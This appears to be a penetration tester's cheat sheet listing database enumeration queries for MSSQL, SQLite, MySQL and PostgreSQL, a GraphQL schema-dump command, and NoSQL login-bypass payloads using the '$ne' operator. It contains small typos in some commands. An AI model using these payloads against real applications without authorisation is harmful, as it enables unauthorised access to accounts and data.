## MSSQL queries
```sql
SELECT name FROM master.dbo.sysdatabases # List databases
SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES # List tables
SELECT table_name FROM all_tables # List tables
SELECT column_name FROM all_tab_columns WHERE table_name = '<table_name>' # List columns
```

## SQLite queries
References: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' # List tables
SELECT sql FROM sqlite_master WHERE type!='meta' AND SQL NOT NULL AND name NOTE LIKE 'sqlite_%' AND name='<table>' # List columns
```

## MySQL queries
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.schemata # List databases
SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables WHERE table_schema !='mysql' AND table_schema!='information_schema' AND table_schema != 'performance_schema' AND table_schema != 'sys' # List tables
SELECT table_schema, table_name, column_name FROM INFORMATION_SCHEMA.columns WHERE table_schema!='mysql' AND table_schema!='information_schema' # List columns
```

## Postgresql
In psql:
```bash
\l # Lists all databases on the server
\c [database_name] # Connect to a specific database
\dt # Lists all tables in the current database
\d [table_name] # Describes the structure of a specific table
\du # Lists all roles (users) on the server
\q # Quits the psql interface
SELECT # Retrieves data from a table
INSERT INTO # Inserts data into a table
UPDATE # Modifies data in a table
DELETE # Deletes data from a table
CREATE # Creates a new table, index, or other database object
ALTER # Modifies the structure of a table
DROP # Deletes a table, index, or other database object
GRANT # Grants privileges to a role
REVOKE # Revokes privileges from a role
BEGIN # Begins a transaction
COMMIT # Commits a transaction
ROLLBACK # Rolls back a transaction
```

## GraphQL
Use `inql` to dump schemas: https://github.com/doyensec/inql
```bash
insql -t http://192.168.206.201/graphql -o inql-dump
```

## NoSQL
```
username[$ne]=admin&password[$ne]=admin&login=login
```
In case it's nodejs:
```json
Content-Type: application/json
{
"username":{"$ne":""},
"password":{"$ne":""}
}
```